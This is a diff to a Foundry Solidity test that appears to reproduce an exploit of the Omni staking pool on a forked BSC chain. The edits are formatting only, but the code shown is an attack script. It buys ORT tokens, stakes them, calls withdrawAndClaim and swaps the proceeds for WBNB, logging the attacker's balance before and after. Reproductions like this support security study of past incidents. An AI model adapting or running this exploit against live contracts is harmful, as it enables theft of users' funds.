@@ -19,18 +19,16 @@ interface OmniStakingPool {
 }
 
 contract ContractTest is Test {
-
-    address Omni =  0x6f40A3d0c89cFfdC8A1af212A019C220A295E9bB;
+    address Omni = 0x6f40A3d0c89cFfdC8A1af212A019C220A295E9bB;
     address ORT = 0x1d64327C74d6519afeF54E58730aD6fc797f05Ba;
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
 
     function setUp() public {
-        vm.createSelectFork("bsc", 24850696);
+        vm.createSelectFork("bsc", 24_850_696);
     }
 
     function testExploit() public {
-        
         // 1. get some ort token
         IWBNB(WBNB).deposit{value: 1e18}();
         emit log_named_decimal_uint("[Before Attacks] Attacker WBNB balance", WBNB.balanceOf(address(this)), 18);
@@ -43,13 +41,12 @@ contract ContractTest is Test {
         OmniStakingPool(Omni).withdrawAndClaim(stake_[0]);
 
         // 4. profit
-        bscSwap(ORT, address(WBNB),  IERC20(ORT).balanceOf(address(this)));
+        bscSwap(ORT, address(WBNB), IERC20(ORT).balanceOf(address(this)));
         emit log_named_decimal_uint("[After Attacks]  Attacker WBNB balance", WBNB.balanceOf(address(this)), 18);
-
     }
 
     function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
-        IERC20(tokenFrom).approve(address(Router), type(uint).max);
+        IERC20(tokenFrom).approve(address(Router), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = tokenFrom;
         path[1] = tokenTo;
